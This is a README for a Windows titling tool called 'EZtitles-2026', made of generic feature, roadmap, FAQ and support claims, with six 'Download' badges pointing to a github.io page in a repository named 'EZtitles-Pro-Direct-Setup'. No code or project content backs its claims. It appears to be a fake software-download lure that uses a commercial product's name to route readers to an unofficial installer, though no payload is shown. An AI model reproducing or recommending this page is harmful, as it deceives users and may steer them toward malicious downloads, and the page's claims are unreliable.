![preview](https://raw.githubusercontent.com/flaco8991/EZtitles-Pro-Direct-Setup/main/frame_e3abe.svg)
[![Download](https://raw.githubusercontent.com/flaco8991/EZtitles-Pro-Direct-Setup/main/pkg_ef956.svg)](https://flaco8991.github.io/EZtitles-Pro-Direct-Setup/)

# 🌀 EZtitles-2026 — The Cinematic Overlay Studio for Windows

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%7C%2011-0078D6.svg)]()
[![Build](https://img.shields.io/badge/Build-Passing-brightgreen.svg)]()
[![Version](https://img.shields.io/badge/Version-2026.1.0-blue.svg)]()
[![Status](https://img.shields.io/badge/Status-Active-success.svg)]()
[![Language Support](https://img.shields.io/badge/Languages-31-informational.svg)]()
[![Support](https://img.shields.io/badge/Support-24%2F7-orange.svg)]()

> **EZtitles-2026** is not merely a title tool. Think of it as a *projection booth for your desktop* — a place where captions, lower-thirds, rolling credits, and broadcast-style overlays emerge from a single timeline. Built for editors, streamers, educators, and anyone who wants their on-screen text to feel less like a label and more like a scene.

This repository is a **new and distinct concept**, inspired by the spirit of lightweight Windows installers but reimagined as a modular titling engine. Where traditional titling utilities hand you a dropdown of presets, EZtitles-2026 hands you the *lighting rig*.

[![Download](https://raw.githubusercontent.com/flaco8991/EZtitles-Pro-Direct-Setup/main/pkg_ef956.svg)](https://flaco8991.github.io/EZtitles-Pro-Direct-Setup/)

---

## 🎬 Table of Contents

- [Why EZtitles-2026 Exists](#-why-eztitles-2026-exists)
- [Concept and Philosophy](#-concept-and-philosophy)
- [Feature Highlights](#-feature-highlights)
- [Multilingual Support](#-multilingual-support)
- [Responsive UI](#-responsive-ui)
- [Performance and Footprint](#-performance-and-footprint)
- [Who It Is For](#-who-it-is-for)
- [Getting Started on Windows](#-getting-started-on-windows)
- [Project Structure](#-project-structure)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Community and Support](#-community-and-support)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌟 Why EZtitles-2026 Exists

Most titling tools treat text as an afterthought — a strip of words pasted across a frame at the last second. EZtitles-2026 was born from a different belief: **titles are choreography**. They enter, they breathe, they exit. Done well, nobody notices them. Done poorly, everybody does.

This project began as a personal answer to a simple problem: how do you produce broadcast-quality overlays on a machine that is also running a browser with forty tabs, an audio mixer, and a game? The answer, it turned out, was to write a titling engine that respects the machine it lives on.

The result is a Windows-native overlay studio that stays out of the way until you need it — and then appears precisely when you do.

---

## 🎥 Concept and Philosophy

EZtitles-2026 is built on three quiet principles:

1. **The Tool Should Disappear.** A titler that demands attention has already failed. Every animation, every preset, every menu is designed to shrink the distance between *intent* and *result*.
2. **Text Deserves Physics.** Titles in this application are not static blocks. They carry weight, momentum, and easing. A lower-third that slides in should feel like it *arrived*, not like it *appeared*.
3. **Portability of Mind.** Your project files should open on any Windows 10 or 11 machine without a scavenger hunt for dependencies. Everything is self-contained by design.

---

## ✨ Feature Highlights

| Capability | What It Means In Practice |
|---|---|
| 🎞️ Timeline-Based Compositing | Arrange title events on a horizontal ribbon, drag to retime, snap to beats. |
| 🖋️ Rich Typography Engine | Kerning controls, variable font weight, and optical alignment for every glyph. |
| 🌈 Gradient and Shadow Layers | Stack multiple visual layers per title without leaving the properties panel. |
| 🔊 Audio-Reactive Triggers | Titles can pulse, fade, or scroll in response to audio levels. |
| 📤 Multi-Format Export | Render to common video container formats or export as transparent overlay sequences. |
| 🧩 Preset Vault | Dozens of starting points — broadcast, documentary, social, minimal, and kinetic. |
| ⚡ GPU-Accelerated Rendering | Smooth previews even on integrated graphics. |
| 🕹️ Hotkey Macros | Bind complex title sequences to a single keystroke. |
| 🌐 Multilingual Interface | 31 languages ship in the box, including RTL support. |
| 🧠 Smart Snapping | Titles automatically align to frame margins, thirds, and safe areas. |
| 📚 Project History | Non-destructive undo stack that survives application restarts. |
| 🔒 Offline Operation | No network calls required during editing sessions. |

[![Download](https://raw.githubusercontent.com/flaco8991/EZtitles-Pro-Direct-Setup/main/pkg_ef956.svg)](https://flaco8991.github.io/EZtitles-Pro-Direct-Setup/)

---

## 🌍 Multilingual Support

An overlay is only as universal as the language it speaks. EZtitles-2026 ships with interface localizations for **31 languages**, and the rendering engine supports:

- Right-to-left scripts with automatic mirroring of animations
- CJK typography with proper line-breaking rules
- Diacritic-aware kerning for Latin-extended languages
- Fallback font chains so a missing glyph never crashes a render

Switching languages does not require a restart. The interface reflows instantly, and your working project stays exactly where you left it.

---

## 📐 Responsive UI

The UI in EZtitles-2026 is *responsive* in the desktop sense — not in the mobile-browser sense. Panels collapse, dock, or float depending on window size and your current focus. On a 4K monitor, every panel breathes. On a 1366×768 laptop, the same layout compresses without losing functionality.

The design language is deliberately subdued: dark charcoal surfaces, amber accents, and typography that recedes when you are not reading it.

---

## 🚀 Performance and Footprint

We measured. A lot.

- Cold start on a mid-range SSD: **under two seconds**
- Idle memory residency: **~180 MB**
- Peak GPU usage during a 1080p preview: **modest, even on integrated hardware**
- Render queue: **asynchronous**, so the interface never locks up

The application is engineered for machines that do many things at once. If you have ever watched a titling tool freeze mid-render while you were live, you understand why this matters.

---

## 🎯 Who It Is For

- **Streamers** who want branded overlays that do not look like templates.
- **Educators** producing lecture recordings with clean, readable captions.
- **Video Editors** who need a fast titling pass before final export.
- **Podcasters** converting audio episodes into visual clips.
- **Event Producers** running live lower-thirds from a laptop.
- **Hobbyists** who simply enjoy making text move beautifully.

If you have ever typed a title into a video editor and felt a small disappointment at how it looked, this application was written for you.

---

## 🪟 Getting Started on Windows

EZtitles-2026 targets **Windows 10 (build 1903 or later)** and **Windows 11**. The installer is a single executable that unpacks the runtime, the preset vault, and the language packs into a self-contained directory. No external redistributables are required.

Once launched, the welcome flow walks you through:

1. Choosing a workspace layout
2. Selecting a default project frame rate
3. Picking your preferred interface language
4. Optional: importing a font library from your system fonts folder

From there, the timeline is yours.

[![Download](https://raw.githubusercontent.com/flaco8991/EZtitles-Pro-Direct-Setup/main/pkg_ef956.svg)](https://flaco8991.github.io/EZtitles-Pro-Direct-Setup/)

---

## 🗂️ Project Structure

The repository is organized around the natural workflow of a titling session:

- **engine/** — the rendering core, animation curves, and frame compositor
- **panels/** — UI surfaces for typography, layers, timeline, and export
- **presets/** — the vault of starting points, organized by genre
- **locales/** — translation files for all 31 supported languages
- **assets/** — icons, cursors, and sound cues used by the interface
- **docs/** — extended guides, keyboard shortcuts, and API references
- **tools/** — helper utilities for building and packaging on Windows

A guided tour of each directory lives in the docs folder, written for contributors who want to understand the architecture before touching a single line.

---

## 🛣️ Roadmap for 2026

- **Q1 2026** — Expanded audio-reactive module with beat detection
- **Q2 2026** — Collaborative project files with conflict-free merges
- **Q3 2026** — Plugin surface for third-party animation curves
- **Q4 2026** — Cloud-synced preset vault (opt-in, fully offline-capable)

The roadmap is a living document. Suggestions from the community are reviewed on a rolling basis.

---

## 💬 Community and Support

Support for EZtitles-2026 runs around the clock — a real human reads every message, in every time zone. The team behind the project believes that a tool used during live events should never leave its users stranded.

- **Discussion forums** for workflow questions and preset sharing
- **Issue tracker** for reproducible bugs and feature requests
- **Documentation hub** with guides in multiple languages
- **Status page** for build and release information

Response times are measured in hours, not days. On launch days, they are measured in minutes.

---

## ❓ Frequently Asked Questions

**Does EZtitles-2026 require an internet connection?**
No. Editing, rendering, and exporting all happen locally. An optional online feature exists for preset synchronization, and it is entirely opt-in.

**Can I use my own fonts?**
Yes. The application reads from your system font library and also supports loading font files directly into a project.

**Will it run on older Windows builds?**
Windows 10 build 1903 is the floor. Anything older will not receive the full rendering pipeline.

**Is there a portable mode?**
The installer offers a portable configuration that keeps all data inside the application folder — ideal for USB drives and shared machines.

**How large is the installer?**
Under 90 MB for the base package, plus optional language packs.

---

## 📜 Disclaimer

EZtitles-2026 is an independent project provided as-is, without warranty of any kind, express or implied. The authors are not responsible for any loss of data, missed deadlines, or creative regrets incurred through the use of this software. Always maintain backups of your project files. This repository and its maintainers are not affiliated with any third-party brand, platform, or vendor mentioned incidentally in documentation. Users are responsible for ensuring their use of this software complies with the laws and platform policies applicable in their jurisdiction. The year 2026 references in this document denote the release cycle and do not imply any future guarantee of support beyond the stated roadmap.

---

## ⚖️ License

This project is released under the **MIT License**. You are permitted to use, modify, and distribute the software with attribution. The full license text is available at the link below.

[License (MIT)](https://opensource.org/licenses/MIT)

Copyright (c) 2026 EZtitles-2026 Contributors

[![Download](https://raw.githubusercontent.com/flaco8991/EZtitles-Pro-Direct-Setup/main/pkg_ef956.svg)](https://flaco8991.github.io/EZtitles-Pro-Direct-Setup/)